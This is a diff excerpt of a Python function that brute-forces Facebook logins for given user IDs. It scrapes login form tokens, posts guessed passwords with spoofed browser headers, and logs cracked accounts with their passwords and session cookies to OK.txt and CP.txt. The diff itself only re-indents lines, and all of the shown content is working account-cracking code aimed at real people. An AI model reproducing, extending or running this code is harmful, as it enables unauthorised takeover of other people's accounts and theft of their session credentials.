@@ -1401,8 +1401,8 @@ def rndm5(uid,passlist):
         au=Ugen()
         try:
                 for pas in passlist:
-			ses = requests.Session()
-			heas = {"Host": "x.facebook.com",
+                        ses = requests.Session()
+                        heas = {"Host": "x.facebook.com",
 				"dnt": "1","upgrade-insecure-requests": "1",
 				"user-agent": au,
 				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -1412,10 +1412,10 @@ def rndm5(uid,passlist):
 				"sec-fetch-dest": "document",
 				"accept-encoding": "gzip, deflate",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
-			link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
-			gett = sop(link.text, "html.parser")
-			datax = gett.find("form",{"method":"post"})["action"]
-			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+                        link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
+                        gett = sop(link.text, "html.parser")
+                        datax = gett.find("form",{"method":"post"})["action"]
+                        data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
 				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
 				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
 				"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
@@ -1425,8 +1425,8 @@ def rndm5(uid,passlist):
 				"pass": pas,
 				"login": "Masuk",
 				"bi_xrwh": "0"}
-			cookie = dict(ses.cookies.get_dict())
-			head = {"Host": " m.facebook.com",
+                        cookie = dict(ses.cookies.get_dict())
+                        head = {"Host": " m.facebook.com",
 				"content-length": "160",
 				"cache-control": "max-age=0",
 				"origin": "https://mbasic.facebook.com",
@@ -1442,23 +1442,23 @@ def rndm5(uid,passlist):
 				"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
 				"accept-encoding": "gzip, deflate",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			xnxx = ses.post(f"https://m.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
-			fb_cookies=ses.cookies.get_dict().keys()
-			if 'c_user' in fb_cookies:
+                        xnxx = ses.post(f"https://m.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
+                        fb_cookies=ses.cookies.get_dict().keys()
+                        if 'c_user' in fb_cookies:
 				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[65:80]
 				print('\033[1;32m [AZIM-OK] '+uidx+'|'+pas+'|'+coki+'\033[0;97m')
 				open('OK.txt', 'a').write(uidx+'|'+pas+'\n')
 				oks.append(uidx)
 				break
-			elif 'checkpoint' in fb_cookies:
+                        elif 'checkpoint' in fb_cookies:
 				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[82:97]
 				print('\033[1;31m [AZIM-CP] '+uidx+' | '+pas+'\033[0;97m')
 				open('CP.txt', 'a').write(uidx+'|'+pas+'\n')
 				cps.append(uidx)
 				break
-			else:
+                        else:
 				continue
 		loop+=1
 	except:
